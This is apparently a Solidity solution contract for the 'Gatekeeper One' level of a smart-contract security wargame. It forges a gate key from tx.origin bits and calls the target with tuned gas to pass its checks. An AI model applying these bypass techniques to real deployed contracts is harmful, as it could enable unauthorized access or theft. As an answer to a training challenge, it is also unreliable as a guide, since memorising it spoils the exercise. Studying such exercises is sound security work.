// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 13. GATE KEEPER ONE
 * @dev Make it past the gatekeeper and register as an entrant to pass this level.
 */

contract LockPickingOne {
    address private gateKeeper;

    constructor(address _gateKeeper) {
        gateKeeper = _gateKeeper;
    }

    function constructGateKey() public view returns (bytes8 gateKey) {
        // Extract the least significant 16 bits from tx.origin
        uint16 ls16BitsTxOrigin = uint16(uint160(tx.origin));
        // Construct the gateKey with the following structure: [non-zero bytes][00..00][ls16BitsTxOrigin]
        // Ensure the most significant 32 bits are not all zeros to satisfy the second requirement
        // Here, '0x0001' is an arbitrary non-zero value to ensure the most significant 32 bits are not all zeros
        gateKey = bytes8(
            uint64(uint64(0x0001000000000000) | uint64(ls16BitsTxOrigin))
        );
        return gateKey;
    }

    function attack(uint256 gas) external {
        bytes8 key = constructGateKey();

        // Pass Gate 2: require(gasleft() % 8191 == 0);
        require(gas < 8191, "gas > 8191");

        (bool success, ) = gateKeeper.call{gas: 8191 * 20 + gas}( // gas == 256
            abi.encodeWithSignature("enter(bytes8)", key)
        );
        require(success, "Attack failed");
    }
}
